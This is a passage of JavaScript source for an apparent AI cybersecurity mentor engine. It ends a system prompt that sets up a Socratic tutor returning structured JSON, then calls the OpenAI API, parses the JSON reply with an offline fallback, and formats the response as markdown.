Adhere strictly to the Socratic Cybersecurity Training Methodology:
- Do NOT provide generic chatbot pleasantries ("Sure!", "I hope this helps!", "As an AI...").
- Act as an elite, tactical, cyber-native tutor who speaks to cybersecurity practitioners with professional terminology (e.g., MITRE ATT&CK techniques, protocol boundaries, memory segments).
- Guide the learner toward finding the flag or code fix by explaining the underlying protocols (TCP handshakes, SMTP envelope/headers, lexical query boundaries).
- Never output direct shell scripts, final exploit commands, or challenge flag codes. Use clues and Socratic questioning instead.
- Provide structured feedback. 

Return ONLY valid JSON with this exact schema:
{
  "explanation": "Highly detailed, step-by-step technical explanation of the protocol mechanics or security vulnerability. Keep it tactical and realistic.",
  "examples": ["Three extremely realistic, concrete real-world attack or log examples showing this threat in action."],
  "prevention": ["Three production-grade, technical mitigation strategies mapped to industry-standards (OWASP, CIS, NIST)."],
  "hint": "A Socratic questioning hint that directs the learner's attention to their configuration or log analysis instead of revealing the answer.",
  "topic": "Distinct Title of the Cybersecurity Domain",
  "difficulty": "beginner|intermediate|advanced"
}

Language Constraint: If the user writes in Arabic, respond with the EXACT same JSON schema but translate all field values into highly professional, technically-native Arabic. Keep English technical terms in parentheses where appropriate (e.g. (Prepared Statements)).
`.trim();

        const userPrompt = `
Learner Profile Level: ${userLevel} (Mapped Difficulty: ${difficulty})
Training Module Context: ${cleanContext}
Cyber Question: ${cleanQuestion}
`.trim();

        const resp = await this.openai.chat.completions.create({
          model: "gpt-4o-mini",
          messages: [
            { role: "system", content: systemPrompt },
            { role: "user", content: userPrompt }
          ],
          temperature: 0.35,
          max_tokens: 1000
        });

        const text = resp.choices?.[0]?.message?.content || "";
        const parsed = this.extractJsonFromText(text);

        if (parsed) {
          return this.normalizeResponse(parsed, fallbackTopic, difficulty);
        }

        if (text && text.trim()) {
          return this.normalizeResponse(
            {
              explanation: text.trim(),
              examples: [],
              prevention: [],
              hint: "Analyze the boundary conditions of the protocol or exploit code.",
              topic: fallbackTopic,
              difficulty
            },
            fallbackTopic,
            difficulty
          );
        }
      } catch (err) {
        console.warn("OpenAI request failed in AIMentorEngine, falling back to offline knowledge base:", err.message);
      }
    }

    return this.getKnowledgeBaseResponse(cleanQuestion, userLevel);
  }

  /**
   * Format mentor response as markdown
   */
  formatAsMarkdown(resp = {}) {
    const normalized = this.normalizeResponse(resp);

    let md = "";

    if (normalized.topic) {
      md += `## Topic\n${normalized.topic}\n\n`;
    }

    if (normalized.difficulty) {
      md += `**Difficulty:** ${normalized.difficulty}\n\n`;
    }

    if (normalized.explanation) {
      md += `## Explanation\n${normalized.explanation}\n\n`;
    }

    if (normalized.examples.length) {
      md += `## Examples\n${normalized.examples.map((e) => `- ${e}`).join("\n")}\n\n`;
    }

    if (normalized.prevention.length) {
      md += `## Prevention\n${normalized.prevention.map((p) => `- ${p}`).join("\n")}\n\n`;
    }

    if (normalized.hint) {
      md += `## Hint\n${normalized.hint}\n`;
    }

    return md.trim();
  }
}

module.exports = AIMentorEngine;